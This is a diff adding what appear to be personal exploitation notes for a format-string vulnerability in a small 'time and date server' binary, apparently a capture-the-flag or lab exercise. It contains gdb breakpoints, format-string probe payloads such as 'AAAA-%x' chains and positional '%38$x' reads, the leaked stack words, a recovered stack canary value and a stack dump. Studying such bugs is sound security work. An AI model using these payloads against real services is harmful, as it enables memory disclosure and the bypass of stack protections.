@@ -1,0 +1,29 @@
+break *action+31
+break *action+58
+break *action+221
+
+view the eax register
+
+AAAA-%38$x-%193$x-%194$x-%195$x
+
+
+AAAA-%x-%x-%x-%x-%x-%x-%x-%x-%x-%x-%x-%x-%x-%x
+AAAA-%32$x-%33$x-%34$x-%35$x-%36$x-%37$x-%38$x-%39$x
+
+AAAA-80d90d1-80d90e4-804a29e-81101c0-a-ffffcdc8-41414141-2d78252d-252d7825-78252d78-2d78252d-252d7825-78252d78-2d78252d-252d7825-78252d78-2d78252d-252d7825
+
+
+CANARY_VALUE:
+0xa0ac5e00
+
+0000| 0xffffcd30 --> 0x80d90ca --> 0x54007325 ('%s')
+0004| 0xffffcd34 --> 0xffffcd4c ("AAAA-%x-%x-%x-%x-%x-%x-%x-%x-%x-%x-%x-%x-%x-%x-%x-%x-%x-%x-%")
+0008| 0xffffcd38 --> 0x80d90e4 ("Welcome to the time and date server!\nPlease select from the following options.\n\tT = Show current time.\n\tD = Show current date.")
+0012| 0xffffcd3c --> 0x804a29e (<action+19>:    add    ebx,0xc5d62)
+0016| 0xffffcd40 --> 0x81101c0 --> 0xfbad2887 
+0020| 0xffffcd44 --> 0xa ('\n')
+0024| 0xffffcd48 --> 0xffffcdc8 --> 0xffffcdf8 --> 0x0 
+0028| 0xffffcd4c ("AAAA-%x-%x-%x-%x-%x-%x-%x-%x-%x-%x-%x-%x-%x-%x-%x-%x-%x-%x-%")
+
+
+%x-%x-%x-%x-%x-%x|%39$x
